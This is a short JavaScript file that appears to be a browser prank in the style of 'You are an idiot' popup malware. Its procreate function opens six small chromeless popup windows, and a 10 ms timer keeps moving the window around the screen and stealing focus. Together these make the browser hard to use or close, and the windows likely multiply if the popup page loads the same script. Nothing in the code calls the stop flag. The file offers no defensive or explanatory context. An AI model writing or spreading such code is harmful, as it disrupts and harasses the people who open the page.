var xOff = 5;
var yOff = 5;
var xPos = 400;
var yPos = -100;
var flagRun = 1;

function openWindow(url) {
  var aWindow = window.open(
    url,
    "_blank",
    "menubar=no,status=no,toolbar=no,resizable=no,width=180,height=175,titlebar=no,alwaysRaised=yes"
  );
}

function procreate() {
  openWindow("openhtml5.html");
  openWindow("openhtml5.html");
  openWindow("openhtml5.html");
  openWindow("openhtml5.html");
  openWindow("openhtml5.html");
  openWindow("openhtml5.html");
}

function newXlt() {
  xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
  window.focus();
}

function newXrt() {
  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
  window.focus();
}

function newYup() {
  yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
  window.focus();
}

function newYdn() {
  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
  window.focus();
}
function fOff() {
  flagRun = 0;
}

function playBall() {
  xPos += xOff;
  yPos += yOff;
  if (xPos > screen.width - 175) {
    newXlt();
  }
  if (xPos < 0) {
    newXrt();
  }
  if (yPos > screen.height - 100) {
    newYup();
  }
  if (yPos < 0) {
    newYdn();
  }
  if (flagRun == 1) {
    window.moveTo(xPos, yPos);
    window.focus();
  }
}
//playBall();
var timeout = setInterval(playBall, 10);
